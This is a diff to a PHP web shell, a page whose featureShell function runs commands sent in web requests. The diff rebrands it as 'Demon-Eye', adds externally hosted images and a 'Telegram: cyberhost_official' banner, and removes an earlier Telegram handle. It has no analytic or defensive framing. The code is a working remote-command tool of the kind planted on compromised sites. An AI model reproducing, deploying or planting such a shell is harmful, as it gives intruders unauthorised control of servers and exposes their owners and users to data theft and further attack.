@@ -1,5 +1,5 @@
 <?php
-
+   
 function featureShell($cmd, $cwd) {
     $stdout = array();
 
@@ -103,12 +103,13 @@ if (isset($_GET["feature"])) {
 }
 
 ?><!DOCTYPE html>
-
+<link rel="SHORTCUT ICON" href="https://i.ibb.co/RYnFPnv/icon.png" />
+<HTML> <body style="background: black; border: 5px solid #888888; margin: 20px; border-radius: 10px; padding-top: 20px;" > <center><img src="https://i.ibb.co/TrD09VM/shell.png" <br><h1 style="margin-top:10px;color:#00ff00; padding:2px 8px; width:25%;">Telegram: cyberhost_official</h1>
 <html>
 
     <head>
         <meta charset="UTF-8" />
-        <title>Demon@shell:~#</title>
+        <title>Demon-Eye</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -333,7 +334,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "Demon@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return "Demon-Eye:~#<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
@@ -453,7 +454,6 @@ if (isset($_GET["feature"])) {
 	                         /$\    $$$/              <span></span>
                                  | $$$$$$$/  		 <span></span>
 	                         \______/           	 <span></span>
-Telegram: sleepercell_official			 <span></span>
                   </div>
             </pre>
             <div id="shell-input">
